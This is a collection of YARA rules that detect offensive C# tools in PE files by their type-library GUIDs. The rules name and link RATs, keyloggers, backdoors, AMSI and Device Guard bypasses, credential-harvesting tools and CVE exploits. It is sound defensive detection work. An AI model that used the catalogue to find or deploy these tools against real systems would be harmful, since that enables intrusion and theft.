HKTL_NET_GUID_AddReferenceDotRedTeam {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ceramicskate0/AddReferenceDotRedTeam\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"73c79d7e-17d4-46c9-be5a-ecef65b924e4\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Lime_Crypter {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Lime-Crypter\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"f93c99ed-28c9-48c5-bb90-dd98f18285a6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_BrowserGhost {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/QAX-A-Team/BrowserGhost\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"2133c634-4139-466e-8983-9a23ec99e01b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpShot {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tothi/SharpShot\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"057aef75-861b-4e4b-a372-cfbd8322c8e1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Offensive__NET {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mrjamiebowman/Offensive-.NET\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"11fe5fae-b7c1-484a-b162-d5578a802c9c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_RuralBishop {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/RuralBishop\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"fe4414d9-1d7e-4eeb-b781-d278fe7a5619\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DeviceGuardBypasses {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tyranid/DeviceGuardBypasses\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"f318466d-d310-49ad-a967-67efbba29898\" ascii nocase wide\n        $typelibguid1 = \"3705800f-1424-465b-937d-586e3a622a4f\" ascii nocase wide\n        $typelibguid2 = \"256607c2-4126-4272-a2fa-a1ffc0a734f0\" ascii nocase wide\n        $typelibguid3 = \"4e6ceea1-f266-401c-b832-f91432d46f42\" ascii nocase wide\n        $typelibguid4 = \"1e6e9b03-dd5f-4047-b386-af7a7904f884\" ascii nocase wide\n        $typelibguid5 = \"d85e3601-0421-4efa-a479-f3370c0498fd\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AMSI_Handler {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/two06/AMSI_Handler\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"d829426c-986c-40a4-8ee2-58d14e090ef2\" ascii nocase wide\n        $typelibguid1 = \"86652418-5605-43fd-98b5-859828b072be\" ascii nocase wide\n        $typelibguid2 = \"1043649f-18e1-41c4-ae8d-ac4d9a86c2fc\" ascii nocase wide\n        $typelibguid3 = \"1d920b03-c537-4659-9a8c-09fb1d615e98\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_RAT_TelegramSpyBot {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/SebastianEPH/RAT.TelegramSpyBot\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8653fa88-9655-440e-b534-26c3c760a0d3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_TheHackToolBoxTeek {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/teeknofil/TheHackToolBoxTeek\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"2aa8c254-b3b3-469c-b0c9-dcbe1dd101c0\" ascii nocase wide\n        $typelibguid1 = \"afeff505-14c1-4ecf-b714-abac4fbd48e7\" ascii nocase wide\n        $typelibguid2 = \"4cf42167-a5cf-4b2d-85b4-8e764c08d6b3\" ascii nocase wide\n        $typelibguid3 = \"118a90b7-598a-4cfc-859e-8013c8b9339c\" ascii nocase wide\n        $typelibguid4 = \"3075dd9a-4283-4d38-a25e-9f9845e5adcb\" ascii nocase wide\n        $typelibguid5 = \"295655e8-2348-4700-9ebc-aa57df54887e\" ascii nocase wide\n        $typelibguid6 = \"74efe601-9a93-46c3-932e-b80ab6570e42\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_USBTrojan {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mashed-potatoes/USBTrojan\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"4eee900e-adc5-46a7-8d7d-873fd6aea83e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_IIS_backdoor {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/WBGlIl/IIS_backdoor\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"3fda4aa9-6fc1-473f-9048-7edc058c4f65\" ascii nocase wide\n        $typelibguid1 = \"73ca4159-5d13-4a27-8965-d50c41ab203c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ShellGen {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jasondrawdy/ShellGen\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"c6894882-d29d-4ae1-aeb7-7d0a9b915013\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Mass_RAT {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Mass-RAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"6c43a753-9565-48b2-a372-4210bb1e0d75\" ascii nocase wide\n        $typelibguid1 = \"92ba2a7e-c198-4d43-929e-1cfe54b64d95\" ascii nocase wide\n        $typelibguid2 = \"4cb9bbee-fb92-44fa-a427-b7245befc2f3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Browser_ExternalC2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mdsecactivebreach/Browser-ExternalC2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"10a730cd-9517-42d5-b3e3-a2383515cca9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_OffensivePowerShellTasking {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/leechristensen/OffensivePowerShellTasking\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"d432c332-3b48-4d06-bedb-462e264e6688\" ascii nocase wide\n        $typelibguid1 = \"5796276f-1c7a-4d7b-a089-550a8c19d0e8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DoHC2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/SpiderLabs/DoHC2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"9877a948-2142-4094-98de-e0fbb1bc4062\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SyscallPOC {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/SolomonSklash/SyscallPOC\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"1e54637b-c887-42a9-af6a-b4bd4e28cda9\" ascii nocase wide\n        $typelibguid1 = \"198d5599-d9fc-4a74-87f4-5077318232ad\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Pen_Test_Tools {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/awillard1/Pen-Test-Tools\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"922e7fdc-33bf-48de-bc26-a81f85462115\" ascii nocase wide\n        $typelibguid1 = \"ad5205dd-174d-4332-96d9-98b076d6fd82\" ascii nocase wide\n        $typelibguid2 = \"b67e7550-f00e-48b3-ab9b-4332b1254a86\" ascii nocase wide\n        $typelibguid3 = \"5e95120e-b002-4495-90a1-cd3aab2a24dd\" ascii nocase wide\n        $typelibguid4 = \"295017f2-dc31-4a87-863d-0b9956c2b55a\" ascii nocase wide\n        $typelibguid5 = \"abbaa2f7-1452-43a6-b98e-10b2c8c2ba46\" ascii nocase wide\n        $typelibguid6 = \"a4043d4c-167b-4326-8be4-018089650382\" ascii nocase wide\n        $typelibguid7 = \"51abfd75-b179-496e-86db-62ee2a8de90d\" ascii nocase wide\n        $typelibguid8 = \"a06da7f8-f87e-4065-81d8-abc33cb547f8\" ascii nocase wide\n        $typelibguid9 = \"ee510712-0413-49a1-b08b-1f0b0b33d6ef\" ascii nocase wide\n        $typelibguid10 = \"9780da65-7e25-412e-9aa1-f77d828819d6\" ascii nocase wide\n        $typelibguid11 = \"7913fe95-3ad5-41f5-bf7f-e28f080724fe\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_The_Collection {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Tlgyt/The-Collection\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"579159ff-3a3d-46a7-b069-91204feb21cd\" ascii nocase wide\n        $typelibguid1 = \"5b7dd9be-c8c3-4c4f-a353-fefb89baa7b3\" ascii nocase wide\n        $typelibguid2 = \"43edcb1f-3098-4a23-a7f2-895d927bc661\" ascii nocase wide\n        $typelibguid3 = \"5f19919d-cd51-4e77-973f-875678360a6f\" ascii nocase wide\n        $typelibguid4 = \"17fbc926-e17e-4034-ba1b-fb2eb57f5dd3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Change_Lockscreen {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/nccgroup/Change-Lockscreen\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"78642ab3-eaa6-4e9c-a934-e7b0638bc1cc\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_LOLBITS {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Kudaes/LOLBITS\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"29d09aa4-ea0c-47c2-973c-1d768087d527\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Keylogger {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/BlackVikingPro/Keylogger\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"7afbc9bf-32d9-460f-8a30-35e30aa15879\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_CVE_2020_1337 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/neofito/CVE-2020-1337\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"d9c2e3c1-e9cc-42b0-a67c-b6e1a4f962cc\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpLogger {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/djhohnstein/SharpLogger\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"36e00152-e073-4da8-aa0c-375b6dd680c4\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AsyncRAT_C_Sharp {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"619b7612-dfea-442a-a927-d997f99c497b\" ascii nocase wide\n        $typelibguid1 = \"424b81be-2fac-419f-b4bc-00ccbe38491f\" ascii nocase wide\n        $typelibguid2 = \"37e20baf-3577-4cd9-bb39-18675854e255\" ascii nocase wide\n        $typelibguid3 = \"dafe686a-461b-402b-bbd7-2a2f4c87c773\" ascii nocase wide\n        $typelibguid4 = \"ee03faa9-c9e8-4766-bd4e-5cd54c7f13d3\" ascii nocase wide\n        $typelibguid5 = \"8bfc8ed2-71cc-49dc-9020-2c8199bc27b6\" ascii nocase wide\n        $typelibguid6 = \"d640c36b-2c66-449b-a145-eb98322a67c8\" ascii nocase wide\n        $typelibguid7 = \"8de42da3-be99-4e7e-a3d2-3f65e7c1abce\" ascii nocase wide\n        $typelibguid8 = \"bee88186-769a-452c-9dd9-d0e0815d92bf\" ascii nocase wide\n        $typelibguid9 = \"9042b543-13d1-42b3-a5b6-5cc9ad55e150\" ascii nocase wide\n        $typelibguid10 = \"6aa4e392-aaaf-4408-b550-85863dd4baaf\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DarkFender {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xyg3n/DarkFender\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"12fdf7ce-4a7c-41b6-9b32-766ddd299beb\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\n/* FPs with IronPython\nrule HKTL_NET_GUID_IronKit {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/nshalabi/IronKit\"\n        author = \"Arnim Rupp\"\n        score = 50\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"68e40495-c34a-4539-b43e-9e4e6f11a9fb\" ascii nocase wide\n        $typelibguid1 = \"641cd52d-3886-4a74-b590-2a05621502a4\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n*/\n\nrule HKTL_NET_GUID_MinerDropper {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/DylanAlloy/MinerDropper\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"46a7af83-1da7-40b2-9d86-6fd6223f6791\" ascii nocase wide\n        $typelibguid1 = \"8433a693-f39d-451b-955b-31c3e7fa6825\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpDomainSpray {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/HunnicCyber/SharpDomainSpray\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"76ffa92b-429b-4865-970d-4e7678ac34ea\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_iSpyKeylogger {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mwsrc/iSpyKeylogger\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"ccc0a386-c4ce-42ef-aaea-b2af7eff4ad8\" ascii nocase wide\n        $typelibguid1 = \"816b8b90-2975-46d3-aac9-3c45b26437fa\" ascii nocase wide\n        $typelibguid2 = \"279b5533-d3ac-438f-ba89-3fe9de2da263\" ascii nocase wide\n        $typelibguid3 = \"88d3dc02-2853-4bf0-b6dc-ad31f5135d26\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SolarFlare {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mubix/solarflare\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-15\"\n    strings:\n        $typelibguid0 = \"ca60e49e-eee9-409b-8d1a-d19f1d27b7e4\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Snaffler {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/SnaffCon/Snaffler\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"2aa060b4-de88-4d2a-a26a-760c1cefec3e\" ascii nocase wide\n        $typelibguid1 = \"b118802d-2e46-4e41-aac7-9ee890268f8b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpShares {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/djhohnstein/SharpShares/\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"fe9fdde5-3f38-4f14-8c64-c3328c215cf2\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpEDRChecker {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/PwnDexter/SharpEDRChecker\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-18\"\n    strings:\n        $typelibguid0 = \"bdfee233-3fed-42e5-aa64-492eb2ac7047\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpClipHistory {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FSecureLABS/SharpClipHistory\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"1126d5b4-efc7-4b33-a594-b963f107fe82\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpGPO_RemoteAccessPolicies {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FSecureLABS/SharpGPO-RemoteAccessPolicies\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"fbb1abcf-2b06-47a0-9311-17ba3d0f2a50\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Absinthe {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/cameronhotchkies/Absinthe\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"9936ae73-fb4e-4c5e-a5fb-f8aaeb3b9bd6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ExploitRemotingService {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tyranid/ExploitRemotingService\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"fd17ae38-2fd3-405f-b85b-e9d14e8e8261\" ascii nocase wide\n        $typelibguid1 = \"1850b9bb-4a23-4d74-96b8-58f274674566\" ascii nocase wide\n        $typelibguid2 = \"297cbca1-efa3-4f2a-8d5f-e1faf02ba587\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Xploit {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/shargon/Xploit\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"4545cfde-9ee5-4f1b-b966-d128af0b9a6e\" ascii nocase wide\n        $typelibguid1 = \"33849d2b-3be8-41e8-a1e2-614c94c4533c\" ascii nocase wide\n        $typelibguid2 = \"c2dc73cc-a959-4965-8499-a9e1720e594b\" ascii nocase wide\n        $typelibguid3 = \"77059fa1-4b7d-4406-bc1a-cb261086f915\" ascii nocase wide\n        $typelibguid4 = \"a4a04c4d-5490-4309-9c90-351e5e5fd6d1\" ascii nocase wide\n        $typelibguid5 = \"ca64f918-3296-4b7d-9ce6-b98389896765\" ascii nocase wide\n        $typelibguid6 = \"10fe32a0-d791-47b2-8530-0b19d91434f7\" ascii nocase wide\n        $typelibguid7 = \"679bba57-3063-4f17-b491-4f0a730d6b02\" ascii nocase wide\n        $typelibguid8 = \"0981e164-5930-4ba0-983c-1cf679e5033f\" ascii nocase wide\n        $typelibguid9 = \"2a844ca2-5d6c-45b5-963b-7dca1140e16f\" ascii nocase wide\n        $typelibguid10 = \"7d75ca11-8745-4382-b3eb-c41416dbc48c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_PoC {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/thezdi/PoC\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"89f9d411-e273-41bb-8711-209fd251ca88\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpGPOAbuse {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FSecureLABS/SharpGPOAbuse\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"4f495784-b443-4838-9fa6-9149293af785\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Watson {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/Watson\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"49ad5f38-9e37-4967-9e84-fe19c7434ed7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_StandIn {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FuzzySecurity/StandIn\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"01c142ba-7af1-48d6-b185-81147a2f7db7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_azure_password_harvesting {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/guardicore/azure_password_harvesting\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"7ad1ff2d-32ac-4c54-b615-9bb164160dac\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_PowerOPS {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/fdiskyou/PowerOPS\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"2a3c5921-7442-42c3-8cb9-24f21d0b2414\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Random_CSharpTools {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/xorrior/Random-CSharpTools\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-21\"\n    strings:\n        $typelibguid0 = \"f7fc19da-67a3-437d-b3b0-2a257f77a00b\" ascii nocase wide\n        $typelibguid1 = \"47e85bb6-9138-4374-8092-0aeb301fe64b\" ascii nocase wide\n        $typelibguid2 = \"c7d854d8-4e3a-43a6-872f-e0710e5943f7\" ascii nocase wide\n        $typelibguid3 = \"d6685430-8d8d-4e2e-b202-de14efa25211\" ascii nocase wide\n        $typelibguid4 = \"1df925fc-9a89-4170-b763-1c735430b7d0\" ascii nocase wide\n        $typelibguid5 = \"817cc61b-8471-4c1e-b5d6-c754fc550a03\" ascii nocase wide\n        $typelibguid6 = \"60116613-c74e-41b9-b80e-35e02f25891e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_CVE_2020_0668 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/RedCursorSecurityConsulting/CVE-2020-0668\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"1b4c5ec1-2845-40fd-a173-62c450f12ea5\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_WindowsRpcClients {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tyranid/WindowsRpcClients\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"843d8862-42eb-49ee-94e6-bca798dd33ea\" ascii nocase wide\n        $typelibguid1 = \"632e4c3b-3013-46fc-bc6e-22828bf629e3\" ascii nocase wide\n        $typelibguid2 = \"a2091d2f-6f7e-4118-a203-4cea4bea6bfa\" ascii nocase wide\n        $typelibguid3 = \"950ef8ce-ec92-4e02-b122-0d41d83065b8\" ascii nocase wide\n        $typelibguid4 = \"d51301bc-31aa-4475-8944-882ecf80e10d\" ascii nocase wide\n        $typelibguid5 = \"823ff111-4de2-4637-af01-4bdc3ca4cf15\" ascii nocase wide\n        